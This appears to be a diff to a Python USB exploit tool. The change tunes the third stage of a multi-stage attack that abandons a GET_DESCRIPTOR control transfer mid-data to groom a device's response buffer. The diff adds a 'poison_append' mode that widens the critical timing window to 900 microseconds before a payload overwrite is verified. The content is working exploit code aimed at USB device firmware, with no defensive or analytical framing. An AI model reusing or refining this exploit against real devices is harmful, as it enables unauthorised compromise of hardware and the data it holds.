@@ -834,7 +834,13 @@ def stage3(usb, serial_idx, payload, overwrite, spin_us, debug, crit_us=None,
     # 3 full-speed packets.  The sketch's occupation needs the SETUP PROCESSED by
     # the device (response-buffer alloc) with the transfer then abandoned mid-data
     # so no status ZLP ever runs.  Wide window per the trace: 150us..750us.
+    # In --poison-append flow the stale serve pool is cleared by the poison,
+    # so the crit-IN needs time for a FRESH serve: the wider window catches
+    # it (observed: unpoisoned flow serves 64 in ~450us; poisoned flow
+    # serves 0 at 450us).
     crit_us = crit_us or 450
+    if getattr(stage3, 'poison_append', False):
+        crit_us = max(crit_us, 900)
     rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
                             (STRING_DESCRIPTOR << 8) | serial_idx, HABR_LANG,
                             0x81, b'', abandon=True, cancel_at=0,
@@ -998,6 +1004,7 @@ def exploit(args):
     if args.stage in ('all', '3'):
         stage3.sketch_shape = bool(getattr(args, 'sketch_shape', False))
         stage3.wipe = int(getattr(args, 'stage3_wipe', 0))
+        stage3.poison_append = bool(getattr(args, 'poison_append', False))
         stage3(usb, serial_idx, payload, overwrite, args.spin_us, args.debug,
                crit_us=getattr(args, 'crit_us', None), live_handle=live)
     serial = verify(usb)
